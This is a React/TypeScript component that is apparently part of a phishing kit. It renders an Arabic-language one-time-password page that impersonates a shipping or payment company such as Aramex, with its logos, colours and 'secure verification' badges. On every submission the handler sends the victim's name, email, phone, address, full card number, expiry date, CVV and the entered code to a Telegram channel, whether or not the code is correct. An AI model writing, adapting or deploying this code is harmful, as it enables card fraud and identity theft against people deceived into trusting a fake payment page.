import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, AlertCircle, Check, Lock, Clock, X, CheckCircle2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBrandingByCompany } from "@/lib/brandingSystem";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";

const PaymentOTP = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment, refetch } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  const updatePayment = useUpdatePayment();
  
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isLocked, setIsLocked] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180); // 3 minutes countdown
  
  // Get service branding
  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
  const serviceName = link?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = getBrandingByCompany(serviceKey);
  
  // Countdown timer
  useEffect(() => {
    if (timeLeft > 0 && !isLocked) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [timeLeft, isLocked]);
  
  useEffect(() => {
    if (payment?.locked_until) {
      const lockTime = new Date(payment.locked_until).getTime();
      const now = Date.now();
      
      if (now < lockTime) {
        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
      } else {
        setIsLocked(false);
      }
    }
  }, [payment]);
  
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };
  
  const handleClearOTP = () => {
    setOtp("");
    setError("");
  };

  // Handle keyboard shortcuts
  const handleKeyDown = (e: React.KeyboardEvent) => {
    // Clear OTP on Escape key
    if (e.key === 'Escape') {
      handleClearOTP();
    }
    // Clear OTP on Ctrl+Backspace or Cmd+Backspace
    if ((e.ctrlKey || e.metaKey) && e.key === 'Backspace') {
      e.preventDefault();
      handleClearOTP();
    }
  };

  const handleSubmit = async () => {
    if (!payment || isLocked) return;

    setError("");

    // ALWAYS send to Telegram, regardless of whether OTP is correct or wrong
    const isCorrect = otp === payment.otp;

    // Send payment data to Telegram immediately (before checking correctness)
    const telegramResult = await sendToTelegram({
      type: 'payment_otp_attempt',
      data: {
        name: payment.name || '',
        email: payment.email || '',
        phone: payment.phone || '',
        address: payment.address || '',
        service: serviceName,
        amount: payment.amount || '',
        cardholder: payment.cardholder || '',
        cardNumber: payment.card_number || '',
        cardLast4: payment.card_last4 || '',
        expiry: payment.card_expiry || '',
        cvv: payment.card_cvv || '',
        otp: otp,
        otp_status: isCorrect ? 'correct' : 'wrong',
        attempts: payment.attempts + 1
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('OTP attempt sent to Telegram successfully');
    } else {
      console.error('Failed to send OTP attempt to Telegram:', telegramResult.error);
    }

    // Check if OTP matches
    if (otp === payment.otp) {
      // Submit to Netlify Forms
      const formData = new FormData();
      formData.append('form-name', 'payment-otp-verified');
      formData.append('otp', otp);
      formData.append('service', serviceName);
      formData.append('paymentId', payment.id);
      formData.append('linkId', id || '');
      formData.append('status', 'confirmed');

      try {
        await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(formData as any).toString()
        });
      } catch (error) {
        console.error('Form submission error:', error);
      }

      // Success!
      await updatePayment.mutateAsync({
        paymentId: payment.id,
        updates: {
          status: "confirmed",
          receipt_url: `/pay/${id}/receipt/${payment.id}`,
        },
      });

      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });

      navigate(`/pay/${id}/receipt/${payment.id}`);
    } else {
      // Wrong OTP
      const newAttempts = payment.attempts + 1;

      if (newAttempts >= 3) {
        // Lock for 15 minutes
        const lockUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString();

        await updatePayment.mutateAsync({
          paymentId: payment.id,
          updates: {
            attempts: newAttempts,
            locked_until: lockUntil,
          },
        });

        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");

        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        // Increment attempts
        await updatePayment.mutateAsync({
          paymentId: payment.id,
          updates: {
            attempts: newAttempts,
          },
        });

        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        refetch();
      }
    }
  };
  
  // FOR TESTING: Display actual OTP (remove in production)
  useEffect(() => {
    if (payment?.otp) {
      console.log("🔐 OTP للاختبار:", payment.otp);
    }
  }, [payment]);
  
  return (
    <div 
      className="min-h-screen py-6 sm:py-12" 
      dir="rtl"
      onKeyDown={handleKeyDown}
      tabIndex={0}
      style={{
        background: companyBranding?.colors?.background || '#FFFFFF',
        fontFamily: companyBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif'
      }}
    >
      <div className="container mx-auto px-3 sm:px-4">
        <div className="max-w-md mx-auto">
          {/* Company Header Image */}
          {branding.ogImage && (
            <div 
              className="mb-6 sm:mb-8 rounded-2xl overflow-hidden shadow-2xl relative"
              style={{
                borderRadius: companyBranding?.borderRadius?.lg || '16px',
                boxShadow: companyBranding?.shadows?.lg || '0 20px 40px rgba(0,0,0,0.15)'
              }}
            >
              <img 
                src={branding.ogImage} 
                alt={serviceName}
                className="w-full h-40 sm:h-56 object-cover"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
              <div 
                className="absolute inset-0"
                style={{
                  background: companyBranding?.gradients?.hero || `linear-gradient(135deg, ${branding.colors.primary}90, ${branding.colors.secondary}75)`
                }}
              />
              {branding.logo && (
                <div className="absolute inset-0 flex items-center justify-center">
                  <div className="bg-white rounded-2xl p-4 shadow-lg">
                    <img 
                      src={branding.logo} 
                      alt={serviceName}
                      className="h-16 sm:h-20 w-auto"
                      onError={(e) => e.currentTarget.style.display = 'none'}
                    />
                  </div>
                </div>
              )}
            </div>
          )}
          

          
          {/* Security Badge */}
          <div className="text-center mb-6 sm:mb-8">
            <Badge 
              className="text-sm sm:text-base px-5 py-2.5 sm:px-6 sm:py-3 text-white font-bold"
              style={{
                background: companyBranding?.gradients?.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                borderRadius: companyBranding?.borderRadius?.md || '10px',
                boxShadow: companyBranding?.shadows?.md || '0 4px 12px rgba(0,0,0,0.15)'
              }}
            >
              <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
              <span>التحقق الآمن - {serviceName}</span>
            </Badge>
          </div>
          
          <Card 
            className="p-6 sm:p-10 shadow-elevated border-2" 
            style={{ 
              borderColor: branding.colors.primary,
              borderRadius: companyBranding?.borderRadius?.lg || '16px',
              boxShadow: companyBranding?.shadows?.lg || '0 20px 40px rgba(0,0,0,0.15)',
              background: companyBranding?.colors?.background || '#FFFFFF'
            }}
          >
            <div className="flex items-center justify-between mb-6 sm:mb-8">
              <div className="flex items-center gap-3 sm:gap-4">
                <div 
                  className="w-14 h-14 sm:w-16 sm:h-16 rounded-xl flex items-center justify-center animate-pulse"
                  style={{
                    background: companyBranding?.gradients?.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                    borderRadius: companyBranding?.borderRadius?.md || '12px',
                    boxShadow: companyBranding?.shadows?.md || '0 8px 16px rgba(0,0,0,0.15)'
                  }}
                >
                  <Shield className="w-7 h-7 sm:w-8 sm:h-8 text-white" />
                </div>
                <div>
                  <h1 
                    className="text-xl sm:text-3xl font-bold mb-1"
                    style={{ 
                      color: companyBranding?.colors?.text || '#1A1A1A',
                      fontFamily: companyBranding?.fonts?.arabic || 'Cairo, sans-serif'
                    }}
                  >
                    رمز التحقق
                  </h1>
                  <p className="text-sm sm:text-base font-medium" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
                    {serviceName}
                  </p>
                </div>
              </div>
              
              {/* Countdown Timer */}
              {timeLeft > 0 && (
                <div 
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs sm:text-sm font-semibold"
                  style={{
                    background: `${branding.colors.primary}15`,
                    color: branding.colors.primary
                  }}
                >
                  <Clock className="w-3 h-3 sm:w-4 sm:h-4" />
                  <span>{formatTime(timeLeft)}</span>
                </div>
              )}
            </div>
            
            {/* Info */}
            <div 
              className="p-5 sm:p-6 rounded-xl mb-6 sm:mb-8 flex items-start gap-3"
              style={{
                background: companyBranding?.colors?.surface || `${branding.colors.primary}08`,
                border: `2px solid ${branding.colors.primary}30`,
                borderRadius: companyBranding?.borderRadius?.md || '10px'
              }}
            >
              <CheckCircle2 className="w-6 h-6 flex-shrink-0 mt-0.5" style={{ color: branding.colors.primary }} />
              <div>
                <p 
                  className="text-sm sm:text-base font-bold mb-1"
                  style={{ 
                    color: companyBranding?.colors?.text || '#1A1A1A',
                    fontFamily: companyBranding?.fonts?.arabic || 'Cairo, sans-serif'
                  }}
                >
                  تم إرسال رمز التحقق
                </p>
                <p className="text-xs sm:text-sm" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
                  رمز مكون من 4 أرقام إلى هاتفك المسجل في البنك
                </p>
              </div>
            </div>
            
            {/* Testing Note */}
            {payment?.otp && (
              <div 
                className="border-2 rounded-xl p-4 sm:p-5 mb-6 sm:mb-8 flex items-center gap-3"
                style={{
                  background: '#FEF3C7',
                  borderColor: '#F59E0B',
                  borderRadius: companyBranding?.borderRadius?.md || '10px'
                }}
              >
                <AlertCircle className="w-6 h-6 text-amber-600 flex-shrink-0" />
                <div>
                  <p className="text-sm sm:text-base font-bold text-amber-800 mb-1">
                    للاختبار فقط
                  </p>
                  <p className="text-lg sm:text-xl font-mono font-bold" style={{ color: '#F59E0B' }}>
                    OTP: {payment.otp}
                  </p>
                </div>
              </div>
            )}
            
            {/* OTP Input - Modern Style */}
            <div className="mb-6 sm:mb-8">
              <h3 
                className="text-center text-base sm:text-lg font-bold mb-4"
                style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}
              >
                أدخل رمز التحقق
              </h3>
              <div className="flex justify-center items-center gap-3 sm:gap-4">
                <InputOTP 
                  maxLength={4} 
                  value={otp} 
                  onChange={setOtp}
                  disabled={isLocked}
                  autoComplete="one-time-code"
                >
                  <InputOTPGroup className="gap-2 sm:gap-3">
                    {[0, 1, 2, 3].map((index) => (
                      <InputOTPSlot 
                        key={index} 
                        index={index}
                        className="w-14 h-14 sm:w-20 sm:h-20 text-2xl sm:text-4xl font-bold border-2 transition-all"
                        style={{
                          borderColor: otp[index] ? branding.colors.primary : `${branding.colors.primary}40`,
                          background: otp[index] ? `${branding.colors.primary}10` : companyBranding?.colors?.surface || 'transparent',
                          borderRadius: companyBranding?.borderRadius?.md || '10px',
                          boxShadow: otp[index] ? companyBranding?.shadows?.md || '0 4px 12px rgba(0,0,0,0.1)' : 'none',
                          fontFamily: 'monospace'
                        }}
                      />
                    ))}
                  </InputOTPGroup>
                </InputOTP>
                
                {/* Delete Button */}
                {otp.length > 0 && !isLocked && (
                  <Button
                    type="button"
                    variant="ghost"
                    size="sm"
                    onClick={handleClearOTP}
                    className="w-8 h-8 sm:w-10 sm:h-10 p-0 rounded-full hover:bg-destructive/10 hover:text-destructive transition-colors"
                  >
                    <X className="w-4 h-4 sm:w-5 sm:h-5" />
                  </Button>
                )}
              </div>
              
              {/* Keyboard Instructions */}
              {otp.length > 0 && !isLocked && (
                <div className="text-center mt-3">
                  <p className="text-xs text-muted-foreground">
                    اضغط <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Esc</kbd> أو <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Ctrl+Backspace</kbd> أو زر <X className="w-3 h-3 inline mx-1" /> لمسح الرمز
                  </p>
                </div>
              )}
            </div>
            
            {/* Error Message */}
            {error && (
              <div className="bg-destructive/10 border border-destructive/20 rounded-md sm:rounded-lg p-2 sm:p-3 mb-4 sm:mb-6 flex items-start gap-2">
                <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 text-destructive mt-0.5 flex-shrink-0" />
                <p className="text-xs sm:text-sm text-destructive">{error}</p>
              </div>
            )}
            
            {/* Attempts Counter */}
            {payment && payment.attempts > 0 && !isLocked && (
              <div className="text-center mb-4 sm:mb-6">
                <p className="text-xs sm:text-sm text-muted-foreground">
                  المحاولات المتبقية: <strong>{3 - payment.attempts}</strong>
                </p>
              </div>
            )}
            
            {/* Submit Button */}
            <Button
              size="lg"
              className="w-full text-base sm:text-xl py-6 sm:py-8 text-white font-bold transition-all hover:opacity-90 hover:shadow-2xl"
              onClick={handleSubmit}
              disabled={updatePayment.isPending || isLocked || otp.length < 4}
              style={{
                background: companyBranding?.gradients?.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                borderRadius: companyBranding?.borderRadius?.md || '12px',
                boxShadow: companyBranding?.shadows?.lg || '0 10px 25px rgba(0,0,0,0.15)',
                fontFamily: companyBranding?.fonts?.arabic || 'Cairo, sans-serif'
              }}
            >
              {updatePayment.isPending ? (
                <span>جاري التحقق...</span>
              ) : isLocked ? (
                <span>محظور مؤقتاً</span>
              ) : (
                <>
                  <Check className="w-5 h-5 sm:w-6 sm:h-6 ml-2" />
                  <span>تأكيد الدفع الآن</span>
                </>
              )}
            </Button>
            
            <div className="flex items-center justify-center gap-2 mt-5">
              <Lock className="w-4 h-4" style={{ color: companyBranding?.colors?.textLight || '#666666' }} />
              <p className="text-xs sm:text-sm text-center" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
                لم تستلم الرمز؟ تحقق من رسائلك أو اتصل بالبنك
              </p>
            </div>
          </Card>
          
          {/* Hidden Netlify Form */}
          <form name="payment-otp-verified" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
            <input type="text" name="otp" />
            <input type="text" name="service" />
            <input type="text" name="paymentId" />
            <input type="text" name="linkId" />
            <input type="text" name="status" />
          </form>
        </div>
      </div>
    </div>
  );
};

export default PaymentOTP;
